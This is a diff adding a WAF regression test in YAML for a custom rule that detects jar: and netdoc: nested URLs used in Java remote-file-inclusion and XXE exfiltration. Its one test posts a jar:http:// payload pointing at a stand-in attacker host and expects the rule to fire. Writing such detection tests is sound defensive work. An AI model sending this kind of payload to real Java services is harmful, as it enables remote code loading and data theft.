@@ -1,0 +1,23 @@
+---
+meta:
+  author: "JiuZhang WAF Team"
+  description: jar/netdoc nested URL, Java RFI/XXE exfil (CUSTOM_PACK)
+rule_id: 1001616
+tests:
+  - test_id: 1
+    desc: "jar:http:// nested URL in parameter"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Content-Type: application/x-www-form-urlencoded
+          method: POST
+          port: 80
+          uri: "/post"
+          data: "u=jar:http://evil.example.com/x.jar!/"
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [1001616]
